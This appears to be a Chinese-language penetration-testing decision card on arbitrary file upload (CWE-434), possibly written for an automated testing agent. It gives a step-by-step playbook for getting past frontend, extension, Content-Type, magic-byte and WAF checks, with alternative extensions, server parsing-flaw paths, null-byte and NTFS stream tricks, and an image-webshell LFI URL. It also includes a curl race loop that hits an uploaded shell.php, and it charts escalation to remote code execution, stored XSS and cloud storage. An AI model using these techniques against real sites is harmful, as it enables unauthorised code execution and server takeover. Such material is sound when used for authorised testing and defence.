# 任意文件上传决策卡 (Light Deep Card)

> **CWE**: 434 | **ROI**: 极高 (P0)
> **轻便原则**: 只放文件上传高 ROI 路由: 前端/后端绕过 / 解析差异 / 路径确认。具体 WebShell 变体不堆。

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| 文件上传功能 (头像/附件/导入/编辑器) | 上传入口 | §1 |
| 上传后响应包含文件路径/URL | 路径可确定 | §2 |
| 上传后响应无路径 | 需推断路径 | §3 |
| 前端 JS 校验后缀 | 仅前端限制 | §1.1 |
| Content-Type 检查 | 后端限制 | §1.2 |
| 文件内容检查 (magic bytes) | 严格后端限制 | §1.3 |
| WAF 拦截 | 需绕过 | §4 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 1. 绕过路由

### 1.1 前端校验绕过

```
1. 抓包上传正常文件 → 记录请求
2. 直接用 curl/Repeater 修改:
   - filename: test.jpg → test.php
   - Content-Type: image/jpeg → application/octet-stream
   - Body 保持 PHP 内容
3. 200 + 路径 → 前端绕过成功
```

### 1.2 后缀黑名单绕过

| 目标 | 替代后缀 |
|------|----------|
| PHP | `.php5` `.phtml` `.pht` `.php.jpg` (配合解析) |
| JSP | `.jspx` `.jspf` `.war` (部署) |
| ASP | `.asa` `.cer` `.cdx` |
| IIS | `.asp;.jpg` `.php.jpg` (双重解析) |
| Nginx 解析 | `test.jpg/.php` 或 `test.jpg%00.php` |

### 1.3 Content-Type 绕过

```
1. 上传 .php, Content-Type 设为 image/jpeg
2. 如果只检查 Content-Type → 成功
3. 如果还检查后缀 → 回到 §1.2
```

### 1.4 文件内容检查绕过

| 检查方式 | 绕过方法 |
|----------|----------|
| magic bytes | 文件头加 `GIF89a` + PHP 代码 |
| 图片二次渲染 | 找渲染后不变的区域写入代码 (GIF 最容易) |
| getimagesize() | 真实图片 + 代码在元数据/注释中 |
| 图片压缩 | 代码放 EXIF 注释 / PNG text chunk |

---

## 2. 路径确认 (关键步骤)

**没有路径就无法证明 RCE**,这是上传漏洞最常见的失败点。

### 2.1 响应泄露路径

```
上传 → 响应 JSON 含 {"url": "/uploads/2024/05/test.jpg"}
       或 {"path": "/var/www/upload/test.jpg"}
```

### 2.2 响应无路径时推断

| 线索 | 推断方法 |
|------|----------|
| 响应含文件名哈希 | 推算哈希算法: md5(filename) / md5(filename+time) |
| 同站点其它图片 | 查看图片 URL 模式 → 按模式推断 |
| JS/CSS 路径 | 看静态资源路径模式 → 推断上传目录 |
| 报错信息 | 触发 404/500 → 看路径泄露 |

### 2.3 主动确认路径

```
1. 上传一个合法图片 → 正常显示
2. 浏览器 F12 看图片 URL
3. 按同样规则推断恶意文件路径
4. 如果仍然不确定 → HITL: "无法确认上传路径,是否继续?"
```

---

## 3. 解析与执行

### 3.1 直接执行

路径确认后,访问 `http://target/uploads/shell.php` → 执行代码。

### 3.2 间接执行 (解析漏洞)

| 服务器 | 条件 | 利用 |
|--------|------|------|
| Apache | AddHandler 配置 | `.php.jpg` 被当 PHP 执行 |
| IIS 6.0 | 目录解析 | `/xxx.asp/1.jpg` 当 ASP 执行 |
| IIS 7.0+ | php-cgi | `1.jpg/.php` 当 PHP 执行 |
| Nginx | cgi.fix_pathinfo=1 | `1.jpg/.php` 当 PHP 执行 |
| Nginx | pathinfo 模式 | `1.jpg%00.php` |

### 3.3 包含执行

上传图片马 (含 PHP 代码),通过 LFI/文件包含 执行:
```
http://target/index.php?page=./uploads/1.jpg
```

### 3.4 竞争执行

```bash
# 上传 + 持续访问, 在后端删除前命中执行
while true; do curl http://target/uploads/shell.php; done
```

---

## 4. 绕过路由

| 过滤 | 绕过方法 |
|------|----------|
| 后缀黑名单 | §1.2 替代后缀 |
| 双重后缀删除 | `.pphphp` → 删一次 → `.php` |
| 路径中 `..` 被删 | `....//....//` → 删一次 → `../../` |
| WAF 拦截 `<?php` | `<script language="php">` / 短标签 `<?=` |
| 文件名特殊字符 | Windows: `test.php:<DATA>` (NTFS ADS) / `test.php::$DATA` |
| 空格/点截断 | `test.php%20` / `test.php.` (Windows 去尾空格/点) |
| `%00` 截断 | `test.php%00.jpg` (PHP <5.3.4 / Java 旧版) |

---

## 5. Triage

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| 上传成功但访问 404 | 路径推断错误 | §2 重新确认路径 |
| 上传成功但文件被改后缀 | 后端强制改名 | 试解析漏洞 / 文件包含 |
| 上传成功但内容被清空 | 二次渲染 | 找渲染不变区 / 转 HTML 注入 |
| 200 但无任何文件 | 上传到对象存储 (S3/OSS) | 试存储桶公开读写 → [../cloud-security.md](../cloud-security.md) |
| WAF 拦截所有 PHP 后缀 | 严格限制 | 试 .htaccess 覆盖 / Web.config / 转 HTML 存储型 XSS |
| 上传 HTML 被拦截 | 内容检查 | 试 SVG (可含 JS) |

---

## 6. 级联

- 上传 → WebShell RCE → [cmdi.md](cmdi.md)
- 上传图片马 → LFI 包含执行 → [path-traversal.md](path-traversal.md)
- 上传 HTML/SVG → 存储型 XSS → [xss.md](xss.md)
- 上传 .htaccess → 覆盖配置 → Apache 解析链
- 上传到 OSS/S3 → [../cloud-security.md](../cloud-security.md)

---

## 7. 相关参考

- 命令注入 → [cmdi.md](cmdi.md)
- 路径遍历 / LFI → [path-traversal.md](path-traversal.md)
- XSS → [xss.md](xss.md)
- WAF 绕过 → [../waf-bypass.md](../waf-bypass.md)
- 云安全 (对象存储) → [../cloud-security.md](../cloud-security.md)
